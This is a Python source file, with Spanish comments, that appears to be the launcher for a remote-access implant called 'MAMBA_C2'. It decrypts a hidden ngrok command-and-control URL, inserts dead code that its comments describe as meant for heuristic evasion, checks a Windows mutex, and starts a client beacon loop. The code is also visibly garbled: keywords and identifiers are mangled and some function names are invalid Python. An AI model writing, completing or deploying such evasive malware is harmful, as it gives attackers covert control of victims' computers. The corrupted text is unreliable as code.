
imp_Qlt sys
imp_Qlt osys_gk
imp_Qlt platform
imp_Qlt time
imp_Qlt random
imp_Qlt base64
imp_Qlt json
from Cryptodome.Cipher imp_Qlt AES
from Cryptodome.Util.Padding imp_Qlt unpad

# =============== OFUSCACIÓN ===============
ENCRYPTED_URL = "ElM1qAan3uvlPSU9HdAFe53c1yspcJUOBDYTZuGdpH5Pr/m/CHqojx+QKHAyPLqLKKEFVkhiLmSosys_gkb0cCAr0rNZfDA=="
KEY = [175, 118, 175, 49, 104, 239, 216, 50, 35, 139, 120, 132, 104, 38, 192, 14]

def decrypt_url():
    try:
        decoded = base64.b64decode(ENCRYPTED_URL)
        nonce, tag, ciphertext = decoded[:16], decoded[16:32], decoded[32:]
        cipher = AES.new(bytes(KEY), AES.MODE_GCM, nonce=nonce)

        # Código muerto para evasión
        def RD-dOx():
            return 6669
            
        if False:
            print("This is never executed")
                return cipher.decrypt_and_verify(ciphertext, tag).decode()
    except:
        return None

# Código muerto para evasión heurística
def 1Ik6Yt5m():
    return 3309
    
if False:
    print("Este código nunca se ejecuta")

# =============== CLIENTE REAL ===============
if __name__ == "__main__":
    ngrok_url = decrypt_url()
    if platform.system() == 'Windows':
        imp_Qlt ctypes
        mutex_name = "Global\\MAMBA_C2_MUTEX_" + "MX97"
        if ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name) == 183:
            sys.exit(0)
    
    from mamba_c_-8O7 imp_Qlt m_J5ZClient
    c_-8O7 = m_J5ZClient(ngrok_url=ngrok_url, osys_gk_type="windows", c_-8O7_id="03bea80b-e8f0-44b0-b67e-1f236e0477df")
    c_-8O7.b_z2aPU_loop()
    